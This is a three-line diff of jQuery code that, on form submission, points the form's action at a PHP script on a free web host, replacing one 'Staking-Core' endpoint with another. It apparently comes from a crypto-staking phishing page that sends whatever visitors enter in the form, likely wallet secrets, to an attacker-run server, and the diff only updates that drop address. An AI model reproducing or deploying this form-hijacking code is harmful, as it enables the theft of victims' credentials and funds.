@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://stakecoredao.epizy.com/stake.php?Staking-Core");
+  $(myform).attr("action", "https://stakeekers.000webhostapp.com/panteelk.php?Staking-Core");
 });
